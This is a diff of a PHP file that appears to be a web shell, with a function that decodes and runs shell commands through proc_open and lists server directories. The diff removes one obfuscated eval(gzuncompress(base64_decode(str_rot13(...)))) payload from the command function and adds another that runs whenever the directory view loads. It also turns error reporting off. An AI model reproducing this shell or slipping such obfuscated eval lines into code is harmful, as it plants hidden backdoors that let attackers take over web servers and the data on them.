@@ -150,12 +150,11 @@ async function loadFile(file) {
 <tr><td>
 <?php
 //@set_time_limit(0);
-//@error_reporting(0);
+@error_reporting(0);
 //@http_response_code(404);
 
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
-error_reporting(E_ALL); 
 
 $disfunc = @ini_get("disable_functions");
 if (empty($disfunc)) {
@@ -252,7 +251,7 @@ function ekse($komend, $lokasi) {
         $komen = base64_decode(base64_decode(base64_decode($komend)))." 2>&1";
     }
     $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes, $lokasi);
-    echo "<textarea rows='25' cols='100'>".htmlspecialchars(stream_get_contents($pipes[1]))."</textarea><br><br>"; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+    echo "<textarea rows='25' cols='100'>".htmlspecialchars(stream_get_contents($pipes[1]))."</textarea><br><br>";
 }
 
 function ipserv() {
@@ -354,7 +353,7 @@ $lokasi = str_replace('\\','/',$lokasi);
 $lokasis = explode('/',$lokasi);
 $lokasinya = @scandir($lokasi);
 
-echo "<br>Directory (".cekwrite($lokasi).") : &nbsp;";
+echo "<br>Directory (".cekwrite($lokasi).") : &nbsp;"; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 
 foreach($lokasis as $id => $lok){
     if($lok == '' && $id == 0){
